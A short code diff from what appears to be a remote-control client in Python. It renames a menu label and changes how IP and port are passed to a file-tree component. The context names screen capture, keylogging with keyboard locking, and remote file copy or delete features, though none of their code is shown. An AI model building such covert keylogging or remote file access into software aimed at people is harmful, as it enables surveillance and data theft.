@@ -99,7 +99,7 @@ class Client(object):
             self.command_CaptureScreen()
         elif func == "Keylog and lock keyboard":
             self.command_Keylog()
-        elif func == "Show directory tree and copy/delete files":
+        elif func == "Show and copy/delete files":
             self.command_DirTree()
 
     
@@ -146,7 +146,7 @@ class Client(object):
         processThread=threading.Thread(target=ins.loadApp())
         processThread.start()
     def command_DirTree(self):
-        ft = dirtree.FileTree(self.root, ip=self.IP, port=self.port_no)
+        ft = dirtree.FileTree(self.root, self.IP, self.port_no)
         instanceThread = threading.Thread(target=ft.startInstance())
         instanceThread.start()
     
